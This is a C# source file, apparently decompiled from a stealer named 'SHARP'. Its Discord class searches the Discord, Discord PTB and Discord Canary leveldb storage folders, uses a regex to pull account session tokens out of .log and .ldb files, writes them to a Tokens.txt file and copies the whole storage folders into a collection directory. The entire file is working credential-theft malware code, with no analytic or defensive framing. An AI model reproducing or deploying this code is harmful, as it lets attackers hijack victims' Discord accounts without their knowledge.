﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace SHARP
{
	// Token: 0x02000039 RID: 57
	internal class Discord
	{
		// Token: 0x0600010F RID: 271 RVA: 0x00006530 File Offset: 0x00004730
		public static void WriteDiscord()
		{
			try
			{
				string text = Help.ExploitDir + "\\Discord";
				string[] tokens = Discord.GetTokens();
				if (tokens.Length != 0)
				{
					Directory.CreateDirectory(text);
					foreach (string str in tokens)
					{
						File.AppendAllText(text + "\\Tokens.txt", str + "\n");
					}
				}
				Discord.CopyLevelDb();
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		// Token: 0x06000110 RID: 272 RVA: 0x000065B0 File Offset: 0x000047B0
		private static void CopyLevelDb()
		{
			string path = Help.ExploitDir + "\\Discord";
			foreach (string path2 in Discord.DiscordDirectories)
			{
				string directoryName = Path.GetDirectoryName(Path.Combine(Paths.appdata, path2));
				string destFolder = Path.Combine(path, new DirectoryInfo(directoryName).Name);
				if (!Directory.Exists(directoryName))
				{
					return;
				}
				try
				{
					Filemanager.CopyDirectory(directoryName, destFolder);
					Counting.Discord++;
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000111 RID: 273 RVA: 0x00006640 File Offset: 0x00004840
		public static string[] GetTokens()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (string path in Discord.DiscordDirectories)
				{
					string text = Path.Combine(Paths.appdata, path);
					string text2 = Path.Combine(Path.GetTempPath(), new DirectoryInfo(text).Name);
					if (Directory.Exists(text))
					{
						Filemanager.CopyDirectory(text, text2);
						foreach (string text3 in Directory.GetFiles(text2))
						{
							if (text3.EndsWith(".log") || text3.EndsWith(".ldb"))
							{
								string input = File.ReadAllText(text3);
								Match match = Discord.TokenRegex.Match(input);
								if (match.Success)
								{
									list.Add(match.Value ?? "");
								}
								Counting.Discord++;
							}
						}
						Filemanager.RecursiveDelete(text2);
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return list.ToArray();
		}

		// Token: 0x04000089 RID: 137
		private static Regex TokenRegex = new Regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}");

		// Token: 0x0400008A RID: 138
		private static string[] DiscordDirectories = new string[]
		{
			"Discord\\Local Storage\\leveldb",
			"Discord PTB\\Local Storage\\leveldb",
			"Discord Canary\\leveldb"
		};
	}
}
